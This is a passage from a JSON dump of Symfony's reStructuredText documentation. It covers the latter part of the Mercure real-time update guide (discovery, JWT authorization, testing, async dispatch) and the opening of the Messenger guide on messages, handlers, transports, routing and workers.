sub-tab.\n\nDiscovery\n---------\n\nThe Mercure protocol comes with a discovery mechanism.\nTo leverage it, the Symfony application must expose the URL of the Mercure Hub\nin a ``Link`` HTTP header.\n\n.. raw:: html\n\n    <object data=\"_images/mercure/discovery.svg\" type=\"image/svg+xml\"\n        alt=\"Flow diagram showing the Link response header set by the Symfony app to respond to an API request for a book with ID 1.\"\n    ></object>\n\nYou can create ``Link`` headers with the ``Discovery`` helper class\n(under the hood, it uses the :doc:`WebLink Component </web_link>`)::\n\n    // src/Controller/DiscoverController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\JsonResponse;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\Mercure\\Discovery;\n\n    class DiscoverController extends AbstractController\n    {\n        public function discover(Request $request, Discovery $discovery): JsonResponse\n        {\n            // Link: <https://hub.example.com/.well-known/mercure>; rel=\"mercure\"\n            $discovery->addLink($request);\n\n            return $this->json([\n                '@id' => '/books/1',\n                'availability' => 'https://schema.org/InStock',\n            ]);\n        }\n    }\n\nThen, this header can be parsed client-side to find the URL of the Hub,\nand to subscribe to it:\n\n.. code-block:: javascript\n\n    // Fetch the original resource served by the Symfony web API\n    fetch('/books/1') // Has Link: <https://hub.example.com/.well-known/mercure>; rel=\"mercure\"\n        .then(response => {\n            // Extract the hub URL from the Link header\n            const hubUrl = response.headers.get('Link').match(/<([^>]+)>;\\s+rel=(?:mercure|\"[^\"]*mercure[^\"]*\")/)[1];\n\n            // Append the topic(s) to subscribe as query parameter\n            const hub = new URL(hubUrl, window.origin);\n            hub.searchParams.append('topic', 'https://example.com/books/{id}');\n\n            // Subscribe to updates\n            const eventSource = new EventSource(hub);\n            eventSource.onmessage = event => console.log(event.data);\n        });\n\nAuthorization\n-------------\n\nMercure also allows dispatching updates only to authorized clients.\nTo do so, mark the update as **private** by setting the third parameter\nof the ``Update`` constructor to ``true``::\n\n    // src/Controller/Publish.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Mercure\\Update;\n\n    class PublishController extends AbstractController\n    {\n        public function publish(HubInterface $hub): Response\n        {\n            $update = new Update(\n                'https://example.com/books/1',\n                json_encode(['status' => 'OutOfStock']),\n                true // private\n            );\n\n            // Publisher's JWT must contain this topic, a URI template it matches or * in mercure.publish or you'll get a 401\n            // Subscriber's JWT must contain this topic, a URI template it matches or * in mercure.subscribe to receive the update\n            $hub->publish($update);\n\n            return new Response('private update published!');\n        }\n    }\n\nTo subscribe to private updates, subscribers must provide to the Hub\na JWT containing a topic selector matching by the topic of the update.\n\nTo provide this JWT, the subscriber can use a cookie,\nor an ``Authorization`` HTTP header.\n\nCookies can be set automatically by Symfony by passing the appropriate options\nto the ``mercure()`` Twig function. Cookies set by Symfony are automatically\npassed by the browsers to the Mercure hub if the ``withCredentials`` attribute\nof the ``EventSource`` class is set to ``true``. Then, the Hub verifies the\nvalidity of the provided JWT, and extract the topic selectors from it.\n\n.. code-block:: html+twig\n\n    <script>\n    const eventSource = new EventSource(\"{{ mercure('https://example.com/books/1', { subscribe: 'https://example.com/books/1' })|escape('js') }}\", {\n        withCredentials: true\n    });\n    </script>\n\nThe supported options are:\n\n* ``subscribe``: the list of topic selectors to include in the ``mercure.subscribe`` claim of the JWT\n* ``publish``: the list of topic selectors to include in the ``mercure.publish`` claim of the JWT\n* ``additionalClaims``: extra claims to include in the JWT (expiration date, token ID...)\n\nUsing cookies is the most secure and preferred way when the client is a web\nbrowser. If the client is not a web browser, then using an authorization header\nis the way to go.\n\n.. warning::\n\n    To use the cookie authentication method, the Symfony app and the Hub\n    must be served from the same domain (can be different sub-domains).\n\n.. tip::\n\n    The native implementation of EventSource doesn't allow specifying headers.\n    For example, authorization using a Bearer token. In order to achieve that, use `a polyfill`_\n\n    .. code-block:: html+twig\n\n        <script>\n        const es = new EventSourcePolyfill(\"{{ mercure('https://example.com/books/1') }}\", {\n            headers: {\n                'Authorization': 'Bearer ' + token,\n            }\n        });\n        </script>\n\nProgrammatically Setting The Cookie\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nSometimes, it can be convenient to set the authorization cookie from your code\ninstead of using the Twig function. MercureBundle provides a convenient service,\n``Authorization``, to do so.\n\nIn the following example controller, the added cookie contains a JWT, itself\ncontaining the appropriate topic selector.\n\nAnd here is the controller::\n\n    // src/Controller/DiscoverController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\JsonResponse;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\Mercure\\Authorization;\n    use Symfony\\Component\\Mercure\\Discovery;\n\n    class DiscoverController extends AbstractController\n    {\n        public function publish(Request $request, Discovery $discovery, Authorization $authorization): JsonResponse\n        {\n            $discovery->addLink($request);\n            $authorization->setCookie($request, ['https://example.com/books/1']);\n\n            return $this->json([\n                '@id' => '/demo/books/1',\n                'availability' => 'https://schema.org/InStock'\n            ]);\n        }\n    }\n\n.. tip::\n\n    You cannot use the ``mercure()`` helper and the ``setCookie()``\n    method at the same time (it would set the cookie twice on a single request). Choose\n    either one method or the other.\n\nProgrammatically Generating The JWT Used to Publish\n---------------------------------------------------\n\nInstead of directly storing a JWT in the configuration,\nyou can create a token provider that will return the token used by\nthe ``HubInterface`` object::\n\n    // src/Mercure/MyTokenProvider.php\n    namespace App\\Mercure;\n\n    use Symfony\\Component\\Mercure\\Jwt\\TokenProviderInterface;\n\n    final class MyTokenProvider implements TokenProviderInterface\n    {\n        public function getJwt(): string\n        {\n            return 'the-JWT';\n        }\n    }\n\nThen, reference this service in the bundle configuration:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/mercure.yaml\n        mercure:\n            hubs:\n                default:\n                    url: https://mercure-hub.example.com/.well-known/mercure\n                    jwt:\n                        provider: App\\Mercure\\MyTokenProvider\n\n    .. code-block:: xml\n\n        <!-- config/packages/mercure.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <config>\n            <hub\n                name=\"default\"\n                url=\"https://mercure-hub.example.com/.well-known/mercure\"\n            >\n                <jwt provider=\"App\\Mercure\\MyTokenProvider\"/>\n            </hub>\n        </config>\n\n    .. code-block:: php\n\n        // config/packages/mercure.php\n        use App\\Mercure\\MyJwtProvider;\n\n        $container->loadFromExtension('mercure', [\n            'hubs' => [\n                'default' => [\n                    'url' => 'https://mercure-hub.example.com/.well-known/mercure',\n                    'jwt' => [\n                        'provider' => MyJwtProvider::class,\n                    ],\n                ],\n            ],\n        ]);\n\nThis method is especially convenient when using tokens having an expiration\ndate, that can be refreshed programmatically.\n\nWeb APIs\n--------\n\nWhen creating a web API, it's convenient to be able to instantly push\nnew versions of the resources to all connected devices, and to update\ntheir views.\n\nAPI Platform can use the Mercure Component to dispatch updates automatically,\nevery time an API resource is created, modified or deleted.\n\nStart by installing the library using its official recipe:\n\n.. code-block:: terminal\n\n    $ composer require api\n\nThen, creating the following entity is enough to get a fully-featured\nhypermedia API, and automatic update broadcasting through the Mercure hub::\n\n    // src/Entity/Book.php\n    namespace App\\Entity;\n\n    use ApiPlatform\\Core\\Annotation\\ApiResource;\n    use Doctrine\\ORM\\Mapping as ORM;\n\n    #[ApiResource(mercure: true)]\n    #[ORM\\Entity]\n    class Book\n    {\n        #[ORM\\Id]\n        #[ORM\\Column]\n        public string $name = '';\n\n        #[ORM\\Column]\n        public string $status = '';\n    }\n\nAs showcased `in this recording`_, the API Platform Client Generator also\nallows to scaffold complete React and React Native applications from this API.\nThese applications will render the content of Mercure updates in real-time.\n\nCheckout `the dedicated API Platform documentation`_ to learn more about\nits Mercure support.\n\nTesting\n-------\n\nDuring unit testing it's usually not needed to send updates to Mercure.\n\nYou can instead make use of the ``MockHub`` class::\n\n    // tests/FunctionalTest.php\n    namespace App\\Tests\\Unit\\Controller;\n\n    use App\\Controller\\MessageController;\n    use Symfony\\Component\\Mercure\\HubInterface;\n    use Symfony\\Component\\Mercure\\JWT\\StaticTokenProvider;\n    use Symfony\\Component\\Mercure\\MockHub;\n    use Symfony\\Component\\Mercure\\Update;\n\n    class MessageControllerTest extends TestCase\n    {\n        public function testPublishing(): void\n        {\n            $hub = new MockHub('https://internal/.well-known/mercure', new StaticTokenProvider('foo'), function(Update $update): string {\n                // $this->assertTrue($update->isPrivate());\n\n                return 'id';\n            });\n\n            $controller = new MessageController($hub);\n\n            // ...\n        }\n    }\n\nFor functional testing, you can instead create a stub of the Hub::\n\n    // tests/Functional/Stub/HubStub.php\n    namespace App\\Tests\\Functional\\Stub;\n\n    use Symfony\\Component\\Mercure\\HubInterface;\n    use Symfony\\Component\\Mercure\\Update;\n\n    class HubStub implements HubInterface\n    {\n        public function publish(Update $update): string\n        {\n            return 'id';\n        }\n\n        // implement rest of HubInterface methods here\n    }\n\nUse ``HubStub`` to replace the default hub service so no updates are actually\nsent:\n\n.. code-block:: yaml\n\n    # config/services_test.yaml\n    services:\n        mercure.hub.default:\n            class: App\\Tests\\Functional\\Stub\\HubStub\n\nAs MercureBundle supports multiple hubs, you may have to replace\nthe other service definitions accordingly.\n\n.. tip::\n\n    Symfony Panther has `a feature to test applications using Mercure`_.\n\nDebugging\n---------\n\n.. versionadded:: 0.2\n\n    The WebProfiler panel was introduced in MercureBundle 0.2.\n\nMercureBundle is shipped with a debug panel. Install the Debug pack to\nenable it::\n\n.. code-block:: terminal\n\n    $ composer require --dev symfony/debug-pack\n\n.. image:: /_images/mercure/panel.png\n    :alt: The Mercure panel of the Symfony Profiler, showing information like time, memory, topics and data of each message sent by Mercure.\n    :class: with-browser\n\nAsync dispatching\n-----------------\n\n.. tip::\n\n    Async dispatching is discouraged. Most Mercure hubs already\n    handle publications asynchronously and using Messenger is\n    usually not necessary.\n\nInstead of calling the ``Publisher`` service directly, you can also let Symfony\ndispatching the updates asynchronously thanks to the provided integration with\nthe Messenger component.\n\nFirst, be sure :doc:`to install the Messenger component </messenger>`\nand to configure properly a transport (if you don't, the handler will\nbe called synchronously).\n\nThen, dispatch the Mercure ``Update`` to the Messenger's Message Bus,\nit will be handled automatically::\n\n    // src/Controller/PublishController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Mercure\\Update;\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n\n    class PublishController extends AbstractController\n    {\n        public function publish(MessageBusInterface $bus): Response\n        {\n            $update = new Update(\n                'https://example.com/books/1',\n                json_encode(['status' => 'OutOfStock'])\n            );\n\n            // Sync, or async (Doctrine, RabbitMQ, Kafka...)\n            $bus->dispatch($update);\n\n            return new Response('published!');\n        }\n    }\n\nGoing further\n-------------\n\n* The Mercure protocol is also supported by :doc:`the Notifier component </notifier>`.\n  Use it to send push notifications to web browsers.\n* `Symfony UX Turbo`_ is a library using Mercure to provide the same experience\n  as with Single Page Applications but without having to write a single line of JavaScript!\n\n.. _`the Mercure protocol`: https://mercure.rocks/spec\n.. _`Server-Sent Events (SSE)`: https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events\n.. _`a polyfill`: https://github.com/Yaffle/EventSource\n.. _`high-level implementations`: https://mercure.rocks/docs/ecosystem/awesome\n.. _`In this recording`: https://www.youtube.com/watch?v=UI1l0JOjLeI\n.. _`Mercure.rocks`: https://mercure.rocks\n.. _`Symfony Docker`: https://github.com/dunglas/symfony-docker/\n.. _`API Platform distribution`: https://api-platform.com/docs/distribution/\n.. _`JSON Web Token`: https://tools.ietf.org/html/rfc7519\n.. _`example JWT`: https://jwt.io/#debugger-io?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZXJjdXJlIjp7InB1Ymxpc2giOlsiKiJdfX0.iHLdpAEjX4BqCsHJEegxRmO-Y6sMxXwNATrQyRNt3GY\n.. _`IRI`: https://tools.ietf.org/html/rfc3987\n.. _`the dedicated API Platform documentation`: https://api-platform.com/docs/core/mercure/\n.. _`the online debugger`: https://uri-template-tester.mercure.rocks\n.. _`a feature to test applications using Mercure`: https://github.com/symfony/panther#creating-isolated-browsers-to-test-apps-using-mercure-or-websocket\n.. _`Symfony UX Turbo`: https://github.com/symfony/ux-turbo\n"
        },
        {
          "name": "messenger.rst",
          "type": "blob",
          "size": 128.1572265625,
          "content": "Messenger: Sync & Queued Message Handling\n=========================================\n\nMessenger provides a message bus with the ability to send messages and then\nhandle them immediately in your application or send them through transports\n(e.g. queues) to be handled later. To learn more deeply about it, read the\n:doc:`Messenger component docs </components/messenger>`.\n\nInstallation\n------------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run this command to\ninstall messenger:\n\n.. code-block:: terminal\n\n    $ composer require symfony/messenger\n\nCreating a Message & Handler\n----------------------------\n\nMessenger centers around two different classes that you'll create: (1) a message\nclass that holds data and (2) a handler(s) class that will be called when that\nmessage is dispatched. The handler class will read the message class and perform\none or more tasks.\n\nThere are no specific requirements for a message class, except that it can be\nserialized::\n\n    // src/Message/SmsNotification.php\n    namespace App\\Message;\n\n    class SmsNotification\n    {\n        public function __construct(\n            private string $content,\n        ) {\n        }\n\n        public function getContent(): string\n        {\n            return $this->content;\n        }\n    }\n\n.. _messenger-handler:\n\nA message handler is a PHP callable, the recommended way to create it is to\ncreate a class that has the :class:`Symfony\\\\Component\\\\Messenger\\\\Attribute\\\\AsMessageHandler`\nattribute and has an ``__invoke()`` method that's type-hinted with the\nmessage class (or a message interface)::\n\n    // src/MessageHandler/SmsNotificationHandler.php\n    namespace App\\MessageHandler;\n\n    use App\\Message\\SmsNotification;\n    use Symfony\\Component\\Messenger\\Attribute\\AsMessageHandler;\n\n    #[AsMessageHandler]\n    class SmsNotificationHandler\n    {\n        public function __invoke(SmsNotification $message)\n        {\n            // ... do some work - like sending an SMS message!\n        }\n    }\n\n.. tip::\n\n    You can also use the ``#[AsMessageHandler]`` attribute on individual class\n    methods. You may use the attribute on as many methods in a single class as you\n    like, allowing you to group the handling of multiple related types of messages.\n\nThanks to :ref:`autoconfiguration <services-autoconfigure>` and the ``SmsNotification``\ntype-hint, Symfony knows that this handler should be called when an ``SmsNotification``\nmessage is dispatched. Most of the time, this is all you need to do. But you can\nalso :ref:`manually configure message handlers <messenger-handler-config>`. To\nsee all the configured handlers, run:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:messenger\n\nDispatching the Message\n-----------------------\n\nYou're ready! To dispatch the message (and call the handler), inject the\n``messenger.default_bus`` service (via the ``MessageBusInterface``), like in a controller::\n\n    // src/Controller/DefaultController.php\n    namespace App\\Controller;\n\n    use App\\Message\\SmsNotification;\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Messenger\\MessageBusInterface;\n\n    class DefaultController extends AbstractController\n    {\n        public function index(MessageBusInterface $bus): Response\n        {\n            // will cause the SmsNotificationHandler to be called\n            $bus->dispatch(new SmsNotification('Look! I created a message!'));\n\n            // ...\n        }\n    }\n\nTransports: Async/Queued Messages\n---------------------------------\n\nBy default, messages are handled as soon as they are dispatched. If you want\nto handle a message asynchronously, you can configure a transport. A transport\nis capable of sending messages (e.g. to a queueing system) and then\n:ref:`receiving them via a worker <messenger-worker>`. Messenger supports\n:ref:`multiple transports <messenger-transports-config>`.\n\n.. note::\n\n    If you want to use a transport that's not supported, check out the\n    `Enqueue's transport`_, which backs services like Kafka and Google\n    Pub/Sub.\n\nA transport is registered using a \"DSN\". Thanks to Messenger's Flex recipe, your\n``.env`` file already has a few examples.\n\n.. code-block:: env\n\n    # MESSENGER_TRANSPORT_DSN=amqp://guest:guest@localhost:5672/%2f/messages\n    # MESSENGER_TRANSPORT_DSN=doctrine://default\n    # MESSENGER_TRANSPORT_DSN=redis://localhost:6379/messages\n\nUncomment whichever transport you want (or set it in ``.env.local``). See\n:ref:`messenger-transports-config` for more details.\n\nNext, in ``config/packages/messenger.yaml``, let's define a transport called ``async``\nthat uses this configuration:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    async: \"%env(MESSENGER_TRANSPORT_DSN)%\"\n\n                    # or expanded to configure more options\n                    #async:\n                    #    dsn: \"%env(MESSENGER_TRANSPORT_DSN)%\"\n                    #    options: []\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:transport name=\"async\">%env(MESSENGER_TRANSPORT_DSN)%</framework:transport>\n\n                    <!-- or expanded to configure more options -->\n                    <framework:transport name=\"async\"\n                        dsn=\"%env(MESSENGER_TRANSPORT_DSN)%\"\n                    >\n                        <option key=\"...\">...</option>\n                    </framework:transport>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->messenger()\n                ->transport('async')\n                    ->dsn(env('MESSENGER_TRANSPORT_DSN'))\n            ;\n\n            $framework->messenger()\n                ->transport('async')\n                    ->dsn(env('MESSENGER_TRANSPORT_DSN'))\n                    ->options([])\n            ;\n        };\n\n.. _messenger-routing:\n\nRouting Messages to a Transport\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nNow that you have a transport configured, instead of handling a message immediately,\nyou can configure them to be sent to a transport:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    async: \"%env(MESSENGER_TRANSPORT_DSN)%\"\n\n                routing:\n                    # async is whatever name you gave your transport above\n                    'App\\Message\\SmsNotification': async\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <framework:routing message-class=\"App\\Message\\SmsNotification\">\n                        <!-- async is whatever name you gave your transport above -->\n                        <framework:sender service=\"async\"/>\n                    </framework:routing>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $framework->messenger()\n                // async is whatever name you gave your transport above\n                ->routing('App\\Message\\SmsNotification')->senders(['async'])\n            ;\n        };\n\nThanks to this, the ``App\\Message\\SmsNotification`` will be sent to the ``async``\ntransport and its handler(s) will *not* be called immediately. Any messages not\nmatched under ``routing`` will still be handled immediately, i.e. synchronously.\n\n.. note::\n\n    You may use a partial PHP namespace like ``'App\\Message\\*'`` to match all\n    the messages within the matching namespace. The only requirement is that the\n    ``'*'`` wildcard has to be placed at the end of the namespace.\n\n    You may use ``'*'`` as the message class. This will act as a default routing\n    rule for any message not matched under ``routing``. This is useful to ensure\n    no message is handled synchronously by default.\n\n    The only drawback is that ``'*'`` will also apply to the emails sent with the\n    Symfony Mailer (which uses ``SendEmailMessage`` when Messenger is available).\n    This could cause issues if your emails are not serializable (e.g. if they include\n    file attachments as PHP resources/streams).\n\nYou can also route classes by their parent class or interface. Or send messages\nto multiple transports:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                routing:\n                    # route all messages that extend this example base class or interface\n                    'App\\Message\\AbstractAsyncMessage': async\n                    'App\\Message\\AsyncMessageInterface': async\n\n                    'My\\Message\\ToBeSentToTwoSenders': [async, audit]\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <!-- route all messages that extend this example base class or interface -->\n                    <framework:routing message-class=\"App\\Message\\AbstractAsyncMessage\">\n                        <framework:sender service=\"async\"/>\n                    </framework:routing>\n                    <framework:routing message-class=\"App\\Message\\AsyncMessageInterface\">\n                        <framework:sender service=\"async\"/>\n                    </framework:routing>\n                    <framework:routing message-class=\"My\\Message\\ToBeSentToTwoSenders\">\n                        <framework:sender service=\"async\"/>\n                        <framework:sender service=\"audit\"/>\n                    </framework:routing>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n            // route all messages that extend this example base class or interface\n            $messenger->routing('App\\Message\\AbstractAsyncMessage')->senders(['async']);\n            $messenger->routing('App\\Message\\AsyncMessageInterface')->senders(['async']);\n            $messenger->routing('My\\Message\\ToBeSentToTwoSenders')->senders(['async', 'audit']);\n        };\n\n.. note::\n\n    If you configure routing for both a child and parent class, both rules\n    are used. E.g. if you have an ``SmsNotification`` object that extends\n    from ``Notification``, both the routing for ``Notification`` and\n    ``SmsNotification`` will be used.\n\n.. tip::\n\n    You can define and override the transport that a message is using at\n    runtime by using the\n    :class:`Symfony\\\\Component\\\\Messenger\\\\Stamp\\\\TransportNamesStamp` on\n    the envelope of the message. This stamp takes an array of transport\n    name as its only argument. For more information about stamps, see\n    `Envelopes & Stamps`_.\n\nDoctrine Entities in Messages\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you need to pass a Doctrine entity in a message, it's better to pass the entity's\nprimary key (or whatever relevant information the handler actually needs, like ``email``,\netc.) instead of the object (otherwise you might see errors related to the Entity Manager)::\n\n    // src/Message/NewUserWelcomeEmail.php\n    namespace App\\Message;\n\n    class NewUserWelcomeEmail\n    {\n        public function __construct(\n            private int $userId,\n        ) {\n        }\n\n        public function getUserId(): int\n        {\n            return $this->userId;\n        }\n    }\n\nThen, in your handler, you can query for a fresh object::\n\n    // src/MessageHandler/NewUserWelcomeEmailHandler.php\n    namespace App\\MessageHandler;\n\n    use App\\Message\\NewUserWelcomeEmail;\n    use App\\Repository\\UserRepository;\n    use Symfony\\Component\\Messenger\\Attribute\\AsMessageHandler;\n\n    #[AsMessageHandler]\n    class NewUserWelcomeEmailHandler\n    {\n        public function __construct(\n            private UserRepository $userRepository,\n        ) {\n        }\n\n        public function __invoke(NewUserWelcomeEmail $welcomeEmail): void\n        {\n            $user = $this->userRepository->find($welcomeEmail->getUserId());\n\n            // ... send an email!\n        }\n    }\n\nThis guarantees the entity contains fresh data.\n\n.. _messenger-handling-messages-synchronously:\n\nHandling Messages Synchronously\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf a message doesn't :ref:`match any routing rules <messenger-routing>`, it won't\nbe sent to any transport and will be handled immediately. In some cases (like\nwhen `binding handlers to different transports`_),\nit's easier or more flexible to handle this explicitly: by creating a ``sync``\ntransport and \"sending\" messages there to be handled immediately:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    # ... other transports\n\n                    sync: 'sync://'\n\n                routing:\n                    App\\Message\\SmsNotification: sync\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/symfony\n                https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <framework:messenger>\n                    <!-- ... other transports -->\n\n                    <framework:transport name=\"sync\" dsn=\"sync://\"/>\n\n                    <framework:routing message-class=\"App\\Message\\SmsNotification\">\n                        <framework:sender service=\"sync\"/>\n                    </framework:routing>\n                </framework:messenger>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/messenger.php\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $messenger = $framework->messenger();\n\n            // ... other transports\n\n            $messenger->transport('sync')->dsn('sync://');\n            $messenger->routing('App\\Message\\SmsNotification')->senders(['sync']);\n        };\n\nCreating your Own Transport\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nYou can also create your own transport if you need to send or receive messages\nfrom something that is not supported. See :doc:`/messenger/custom-transport`.\n\n.. _messenger-worker:\n\nConsuming Messages (Running the Worker)\n---------------------------------------\n\nOnce your messages have been routed, in most cases, you'll need to \"consume\" them.\nYou can do this with the ``messenger:consume`` command:\n\n.. code-block:: terminal\n\n    $ php bin/console messenger:consume async\n\n    # use -vv to see details about what's happening\n    $ php bin/console messenger:consume async -vv\n\nThe first argument is the receiver's name (or service id if you routed to a\ncustom service). By default, the command will run forever: looking for new messages\non your transport and handling them. This command is called your \"worker\".\n\nIf you want to consume messages from all available receivers, you can use the\ncommand with the ``--all`` option:\n\n.. code-block:: terminal\n\n    $ php bin/console messenger:consume --all\n\n.. versionadded:: 7.1\n\n    The ``--all`` option was introduced in Symfony 7.1.\n\n.. tip::\n\n    In a development environment and if you're using the Symfony CLI tool,\n    you can configure workers to be automatically run along with the webserver.\n    You can find more information in the\n    :ref:`Symfony CLI Workers <symfony-server_configuring-workers>` documentation.\n\n.. tip::\n\n    To properly stop a worker, throw an instance of\n    :class:`Symfony\\\\Component\\\\Messenger\\\\Exception\\\\StopWorkerException`.\n\nDeploying to Production\n~~~~~~~~~~~~~~~~~~~~~~~\n\nOn production, there are a few important things to think about:\n\n**Use a Process Manager like Supervisor or systemd to keep your worker(s) running**\n    You'll want one or more \"workers\" running at all times. To do that, use a\n    process control system like :ref:`Supervisor <messenger-supervisor>`\n    or :ref:`systemd <messenger-systemd>`.\n\n**Don't Let Workers Run Forever**\n    Some services (like Doctrine's ``EntityManager``) will consume more memory\n    over time. So, instead of allowing your worker to run forever, use a flag\n    like ``messenger:consume --limit=10`` to tell your worker to only handle 10\n    messages before exiting (then the process manager will create a new process). There\n    are also other options like ``--memory-limit=128M`` and ``--time-limit=3600``.\n\n**Stopping Workers That Encounter Errors**\n    If a worker dependency like your database server is down, or timeout is reached,\n    you can try to add :ref:`reconnect logic <middleware-doctrine>`, or just quit\n    the worker if it receives too many errors with the ``--failure-limit`` option of\n    the ``messenger:consume`` command.\n\n**Restart Workers on Deploy**\n    Each time you deploy, you'll need to restart all your worker processes so\n    that they see the newly deployed code. To do this, run ``messenger:stop-workers``\n    on deployment. This will signal to each worker that it should finish the message\n    it's currently handling and should shut down gracefully. Then, the process manager\n    will create new worker processes. The command uses the :ref:`app <cache-configuration-with-frameworkbundle>`\n    cache internally - so make sure this is configured to use an adapter you like.\n\n**Use the Same Cache Between Deploys**\n    If your deploy strategy involves the creation of new target directories, you\n    should set a value for the :ref:`cache.prefix_seed <reference-cache-prefix-seed>`\n    configuration option in order to use the same cache namespace between deployments.\n    Otherwise, the ``cache.app`` pool will use the value of the ``kernel.project_dir``\n    parameter as base for the namespace, which will lead to different namespaces\n    each time a new deployment is made.\n\nPrioritized Transports\n~~~~~~~~~~~~~~~~~~~~~~\n\nSometimes certain types of messages should have a higher priority and be handled\nbefore others. To make this possible, you can create multiple transports and route\ndifferent messages to them. For example:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/messenger.yaml\n        framework:\n            messenger:\n                transports:\n                    async_priority_high:\n                        dsn: '%env(MESSENGER_TRANSPORT_DSN)%'\n                        options:\n                            # queue_name is specific to the doctrine transport\n                            queue_name: high\n\n                            # for AMQP send to a separate exchange then queue\n                            #exchange:\n                            #    name: high\n                            #queues:\n                            #    messages_high: ~\n                            # for redis try \"group\"\n                    async_priority_low:\n                        dsn: '%env(MESSENGER_TRANSPORT_DSN)%'\n                        options:\n                            queue_name: low\n\n                routing:\n                    'App\\Message\\SmsNotification': async_priority_low\n                    'App\\Message\\NewUserWelcomeEmail': async_priority_high\n\n    .. code-block:: xml\n\n        <!-- config/packages/messenger.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            